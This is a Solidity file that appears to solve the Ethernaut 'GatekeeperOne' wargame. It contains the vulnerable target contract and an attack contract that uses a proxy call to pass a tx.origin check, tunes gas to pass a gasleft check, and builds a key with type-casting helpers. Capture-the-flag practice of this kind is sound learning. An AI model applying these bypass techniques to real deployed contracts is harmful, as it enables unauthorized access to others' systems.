// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttack {
    address immutable gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack(bytes8 _key, uint256 _gas) external {
        /// @notice Requires ~423 gas to pass gateTwo (8614)
        GatekeeperOne(gatekeeperOne).enter{gas: _gas}(_key);
    }

    /// @dev Helper functions
    function convert16(bytes8 _key) public pure returns (uint256) {
        return uint16(uint64(_key));
    }

    function convert32(bytes8 _key) public pure returns (uint256) {
        return uint32(uint64(_key));
    }

    function convertAddress(address _attacker) public pure returns (uint256) {
        return uint16(uint160(_attacker));
    }
}
